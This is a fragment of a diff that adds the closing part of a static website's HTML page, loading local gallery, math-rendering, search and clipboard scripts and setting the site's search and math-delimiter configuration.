+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":-1},"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
